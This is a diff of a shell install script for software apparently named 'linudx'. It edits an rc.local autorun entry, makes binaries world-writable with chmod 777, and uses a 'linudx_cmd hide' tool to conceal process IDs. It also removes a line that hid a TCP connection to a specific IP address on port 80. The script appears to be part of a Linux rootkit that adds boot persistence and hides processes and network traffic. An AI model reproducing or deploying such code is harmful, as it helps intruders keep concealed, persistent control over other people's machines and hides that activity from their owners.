@@ -43,7 +43,7 @@ then
 fi
 
 #uninstall start
-sed -i '\/bin\/linudx-home/d' /etc/rc.d/rc.local
+sed -i '\/bin\/linudx-startup.sh/d' /etc/rc.d/rc.local
 
 #show###############################
 /linudx/linudx_cmd show
@@ -84,7 +84,7 @@ mv /tmp/lainudx-ver.txt /bin/linudx-ver.txt
 
 #add autorun for centos
 
-echo '/bin/linudx-home'>>/etc/rc.d/rc.local
+echo '/bin/linudx-startup.sh'>>/etc/rc.d/rc.local
 
 chmod 777 /bin/linudxd
 chmod 777 /bin/linudxt
@@ -119,5 +119,4 @@ fi
 /linudx/linudx_cmd hide $p1
 /linudx/linudx_cmd hide $p2
 /linudx/linudx_cmd hide $p3
-/linudx/linudx_cmd tcp 103.197.25.82 80 hide
 
